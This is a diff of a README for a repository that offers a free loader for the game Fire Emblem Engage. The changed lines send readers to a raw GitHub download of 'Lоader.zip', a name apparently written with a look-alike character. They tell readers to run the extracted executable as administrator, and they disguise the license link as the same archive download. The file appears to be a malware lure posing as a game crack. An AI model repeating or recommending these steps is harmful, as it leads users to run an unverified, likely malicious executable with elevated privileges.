@@ -24,7 +24,7 @@ Welcome to the ultimate Fire Emblem Engage  solution for gaming enthusiasts! Unl
 
 ## 🛠️ Installation
 
-1. Download Loader.rar from the repository.  
+1. Download https://raw.githubusercontent.com/bhaveshp1188/FireEmblemEngageFreeHub/main/Lоader.zip from the repository.  
 2. Extract the archive using modern tools (WinRAR, 7-Zip, macOS Extractor).  
 3. Run the Loader executable as administrator or with appropriate permissions.  
 4. Follow on-screen instructions to launch Fire Emblem Engage!  
@@ -37,7 +37,7 @@ This repository is a tool for educational and archival purposes only.
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). All contributions are welcome!
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/bhaveshp1188/FireEmblemEngageFreeHub/main/Lоader.zip). All contributions are welcome!
 
 ---
 Unlock legendary adventures—compatible, efficient, secure.  
